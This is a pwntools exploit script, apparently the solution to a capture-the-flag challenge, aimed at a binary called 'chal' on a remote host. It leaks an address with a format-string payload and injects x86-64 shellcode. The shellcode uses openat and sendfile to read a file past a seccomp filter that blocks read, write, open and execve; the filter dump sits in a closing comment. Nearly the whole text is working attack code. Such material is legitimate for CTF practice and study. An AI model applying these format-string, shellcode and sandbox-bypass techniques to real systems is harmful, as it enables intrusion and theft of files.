#!/usr/bin/python3

from pwn import *

exe = ELF('chal', checksec=False)

context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        brva 0x162D
        # brva 0x1549
        c
        ''')
        input()


pa = asm('''
            mov r15, rdx
            push 103
            sub rsp, 0x8
            mov rax, 7020098273099669807
            mov [rsp], rax
            mov rsi, rsp
            mov rdi, 0
            xor rdx, rdx
            mov r10, r15
            mov rax, 0x101
            syscall

            mov rdi, 1
            mov rsi, rax
            mov rdx, 0
            mov r10, 0x100
            mov rax, 	0x28
            syscall
        ''')
if args.REMOTE:
    p = remote('1337.sb', 40001)
else:
    p = process(exe.path)
GDB()
sl(str(0x00000000700000100).encode())
sl(b'%8$p|%p%p%p%p')
sl(pa)
p.recvuntil(b'Thank you ')
leak = int(p.recvuntil(b'|', drop=True), 16)
info("leak " + hex(leak))
sl(b'y')
sl(str(leak))
p.interactive()
'''
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
 0005: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0011
 0007: 0x15 0x03 0x00 0x00000002  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0011
 0009: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0011
 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0011: 0x06 0x00 0x00 0x00000000  return KILL
 https://ctftime.org/writeup/23155
'''
